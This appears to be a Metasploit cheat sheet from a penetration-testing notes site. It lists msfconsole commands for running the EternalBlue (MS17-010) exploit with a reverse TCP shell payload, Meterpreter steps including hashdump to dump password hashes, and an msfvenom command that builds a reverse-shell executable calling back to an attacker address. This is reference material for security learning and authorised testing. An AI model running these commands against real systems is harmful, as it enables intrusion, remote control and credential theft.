---
title: Metasploit
desc: Provides security vulnerabilities and exploit using payloads. It contains Msfconsole, Msfvenom
tags: [ActiveRecon, Linux]
alts: [ExploitDB, Gobuster, Searchsploit]
website:
---

## Msfconsole

```sh
# Start
msfconsole

---

# Search exploits from keywords
msf6 > search ms17-010

# Use an exploit
msf6 > use exploit/windows/smb/smb_17_010_eternalblue

# Show options
msf6 exploit(windows/smb/smb_17_010_eternalblue) > options

# Set option (ex. RHOSTS)
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set rhosts 10.0.0.1
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set lhost 10.0.0.2

# Set payload
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp

# Run exploit
msf6 exploit(windows/smb/smb_17_010_eternalblue) > exploit

# 
# Ctrl + Z to background session
# 
```

<br />

## Meterpreter - An interractive shell

```sh
# Upgrade to meterpreter
msf6 exploit(windows/smb/smb_17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

# Set session
msf6 exploit(post/multi/manage/shell_to_meterpreter) > set session 1

# Run exploit
msf6 exploit(post/multi/manage/shell_to_meterpreter) > exploit

# Select session for use
msf6 exploit(post/multi/manage/shell_to_meterpreter) > sessions 2

# Display the target machine's info
meterpreter > sysinfo

# Move to the target shell
meterpreter > shell

# Dump all passwords on the machine
meterpreter > hashdump
```

<br />

## Msfvenom - Standalone payload generator

```sh
# Get payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows | grep reverse | grep shell

# Show options
msfvenom -p windows/shell_reverse_tcp --list-options

# Set options and execute
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.62.234 LPORT=4444 -f exe > rshell.exe
```